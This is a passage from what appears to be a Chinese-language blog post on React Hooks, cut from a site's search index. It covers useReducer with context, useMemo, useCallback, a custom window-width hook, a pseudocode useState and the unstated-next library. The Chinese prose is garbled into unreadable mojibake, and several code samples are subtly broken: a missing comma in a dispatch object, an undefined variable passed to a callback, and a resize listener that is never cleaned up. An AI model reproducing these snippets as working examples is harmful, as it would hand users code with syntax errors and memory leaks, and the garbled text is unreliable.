&lt;/LoginContext.Provider&gt; )&#125;function LoginButton() &#123; // å­ç»„ä»¶ä¸­ç›´æ¥é€šè¿‡contextæ‹¿åˆ°dispatchï¼Œå‡ºå‘reduceræ“ä½œstate const dispatch = useContext(LoginContext); const click = () =&gt; &#123; if (error) &#123; // å­ç»„ä»¶å¯ä»¥ç›´æ¥ dispatch action dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125; &#125;&#125; æ³¨ï¼šå±€éƒ¨çŠ¶æ€ä¸æ¨èä½¿ç”¨ useReducer ï¼Œä¼šå¯¼è‡´å‡½æ•°å†…éƒ¨çŠ¶æ€è¿‡äºå¤æ‚ï¼Œéš¾ä»¥é˜…è¯»ã€‚ useReducer å»ºè®®åœ¨å¤šç»„ä»¶é—´é€šä¿¡æ—¶ï¼Œç»“åˆ useContext ä¸€èµ·ä½¿ç”¨ã€‚ å‚è€ƒ react-redux useMemoå½“çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ²¡æœ‰è®¾ç½®å…³è”çŠ¶æ€çš„ useEffect ä¼šå…¨éƒ¨æ‰§è¡Œã€‚åŒæ ·çš„ï¼Œé€šè¿‡è®¡ç®—å‡ºæ¥çš„å€¼æˆ–è€…å¼•å…¥çš„ç»„ä»¶ä¹Ÿä¼šé‡æ–°è®¡ç®—/æŒ‚è½½ä¸€éï¼Œå³ä½¿ä¸å…¶å…³è”çš„çŠ¶æ€æ²¡æœ‰å‘ç”Ÿä»»ä½•å˜åŒ–ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº† useMemo æ¥å®ç°ç±»ç»„ä»¶ä¸­ shouldComponetUpdate çš„æ€§èƒ½ä¼˜åŒ–ã€‚ useMemo æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¸€ä¸ª Getter æ–¹æ³•ï¼Œè¿”å›å€¼ä¸ºè¦ç¼“å­˜çš„æ•°æ®æˆ–ç»„ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯¥è¿”å›å€¼ç›¸å…³è”çš„çŠ¶æ€ï¼Œå½“å…¶ä¸­ä»»ä½•ä¸€ä¸ªçŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶å°±ä¼šé‡æ–°è°ƒç”¨ Getter æ–¹æ³•ç”Ÿæˆæ–°çš„è¿”å›å€¼ã€‚ 12345678910111213141516171819import React, &#123; useState, useMemo &#125; from &apos;react&apos;;import &#123; message &#125; from &apos;antd&apos;;export default function HookDemo() &#123; const [count1, changeCount1] = useState(0); const [count2, changeCount2] = useState(10); const calculateCount = useMemo(() =&gt; &#123; message.info(&apos;é‡æ–°ç”Ÿæˆè®¡ç®—ç»“æœ&apos;); return count1 * 10; &#125;, [count1]); return ( &lt;div&gt; &#123;calculateCount&#125; &lt;button onClick=&#123;() =&gt; &#123; changeCount1(count1 + 1); &#125;&#125;&gt;æ”¹å˜count1&lt;/button&gt; &lt;button onClick=&#123;() =&gt; &#123; changeCount2(count2 + 1); &#125;&#125;&gt;æ”¹å˜count2&lt;/button&gt; &lt;/div&gt; );&#125; useCallbackuseCallback ç”¨æˆ·ç”Ÿæˆ Callback ï¼Œé…åˆuseEffect ä½¿ç”¨ï¼ŒæŠ½ç¦»ä¸åŒ useEffect ä¸­å­˜åœ¨çš„ç›¸åŒé€»è¾‘çš„å°è£…ï¼Œå‡å°‘ä»£ç å†—ä½™ã€‚ useCallback çš„ä½¿ç”¨æ–¹æ³•å’Œ useEffect ä¸€è‡´ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç”Ÿæˆçš„å›è°ƒæ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•å…³è”çš„çŠ¶æ€ï¼Œä»»ä¸€çŠ¶æ€å‘ç”Ÿå˜åŠ¨éƒ½ä¼šé‡æ–°ç”Ÿæˆæ–°çš„å›è°ƒã€‚ 1234567891011121314const [count1, changeCount1] = useState(0);const [count2, changeCount2] = useState(10);const calculateCount = useCallback(() =&gt; &#123; if (count1 &amp;&amp; count2) &#123; return count1 * count2; &#125; return count1 + count2;&#125;, [count1, count2])useEffect(() =&gt; &#123; const result = calculateCount(count, count2); message.info(`æ‰§è¡Œå‰¯ä½œç”¨ï¼Œæœ€æ–°å€¼ä¸º$&#123;result&#125;`);&#125;, [calculateCount]) Custom Hooksä¸¾ä¸ªğŸŒ°ï¼Œè‡ªå®šä¹‰ç›‘å¬çª—å£å¤§å°ç»„ä»¶ï¼š 12345678// ä¸€ä¸ªæ˜¾ç¤ºç›®å‰çª—å£å¤§å°çš„ç»„ä»¶function responsiveComponent()&#123; // custom hooks const width = useWindowWidth(); return ( &lt;p&gt;å½“å‰çª—å£çš„å®½åº¦æ˜¯ &#123;width&#125;&lt;/p&gt; )&#125; è‡ªå®šä¹‰ useWindowWidthï¼Œ çª—å£è°ƒæ•´å¤§å°æ—¶ä½¿ç”¨å‰¯ä½œç”¨æ¥è®¾ç½®çŠ¶æ€ï¼š 1234567891011121314import &#123; useState, useEffect&#125; from &apos;react&apos;;// custom hooks to listen window width changefunction useWindowWidth()&#123; const [width, setWidth] = useState(window.innerWidth); useEffect(() =&gt; &#123; const handleResize = ()=&gt;&#123; setWidth(window.innerWidth); &#125; window.addEventListener(&apos;resize&apos;, handleResize); &#125;, [width]); // width æ²¡æœ‰å˜åŒ–åˆ™ä¸å¤„ç† return width;&#125; æ³¨ï¼š custom hooks è¿˜å¯ä»¥å‚è€ƒä¸€ä¸ªæœ‰æ„æ€çš„ hooks åº“ react-useã€‚ åŸç†useState åº•å±‚å®ç° React Hooks: ä¸æ˜¯é­”æ³•ï¼Œåªæ˜¯æ•°ç»„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354let state = [];let setters = [];let firstRun = true;let cursor = 0;function createSetter(cursor) &#123; return function setterWithCursor(newVal) &#123; state[cursor] = newVal; &#125;;&#125;// This is the pseudocode for the useState helperexport function useState(initVal) &#123; if (firstRun) &#123; state.push(initVal); setters.push(createSetter(cursor)); firstRun = false; &#125; const setter = setters[cursor]; const value = state[cursor]; cursor++; return [value, setter];&#125;// Our component code that uses hooksfunction RenderFunctionComponent() &#123; const [firstName, setFirstName] = useState(&quot;Rudi&quot;); // cursor: 0 const [lastName, setLastName] = useState(&quot;Yardley&quot;); // cursor: 1 return ( &lt;div&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Richard&quot;)&#125;&gt;Richard&lt;/Button&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Fred&quot;)&#125;&gt;Fred&lt;/Button&gt; &lt;/div&gt; );&#125;// This is sort of simulating Reacts rendering cyclefunction MyComponent() &#123; cursor = 0; // resetting the cursor return &lt;RenderFunctionComponent /&gt;; // render&#125;console.log(state); // Pre-render: []MyComponent();console.log(state); // First-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]MyComponent();console.log(state); // Subsequent-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]// click the &apos;Fred&apos; buttonconsole.log(state); // After-click: [&apos;Fred&apos;, &apos;Yardley&apos;] Hooks ä¸‹çš„æ•°æ®æµç®¡ç† ç¤¾åŒºæœ‰ä¸€ä¸ªéå¸¸è½»é‡çš„åº“ unstate-next ï¼Œå¯ä»¥åšåˆ°ç®¡ç†å…¨å±€çš„ state ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useState &#125; from &quot;react&quot;import &#123; createContainer &#125; from &quot;unstated-next&quot;import &#123; render &#125; from &quot;react-dom&quot;function useCounter(initialState = 0) &#123; let [count, setCount] = useState(initialState) let decrement = () =&gt; setCount(count - 1) let increment = () =&gt; setCount(count + 1) return &#123; count, decrement, increment &#125;&#125;let Counter = createContainer(useCounter)function CounterDisplay() &#123; let counter = Counter.useContainer() return ( &lt;div&gt; &lt;button onClick=&#123;counter.decrement&#125;&gt;-&lt;/button&gt; &lt;span&gt;&#123;counter.count&#125;&lt;/span&gt; &lt;button onClick=&#123;counter.increment&#125;&gt;+&lt;/button&gt; &lt;/div&gt; )&#125;function App() &#123; return ( &lt;Counter.Provider&gt; &lt;CounterDisplay /&gt; &lt;Counter.Provider initialState=&#123;2&#125;&gt; &lt;div&gt; &lt;div&gt; &lt;CounterDisplay /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/Counter.Provider&gt; &lt;/Counter.Provider&gt; )&#125;render(&lt;App /&gt;, document.getElementById(&quot;root&quot;)) å‚è€ƒæ–‡ç«  ç†è§£ React Hooks React hooks: ä¸æ˜¯é­”æ³•åªæ˜¯æ•°ç»„ React Hook è§£æ How to fetch data with React Hooks React Hooks æ˜¯ä¸èƒ½æ›¿ä»£ Redux çš„ çœ‹å®Œè¿™ç¯‡ï¼Œä½ ä¹Ÿèƒ½æŠŠ React Hooks ç©å‡ºèŠ± Hooks æ—¶ä»£çš„ React çŠ¶æ€ç®¡ç†æ–¹æ¡ˆ]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
</search>
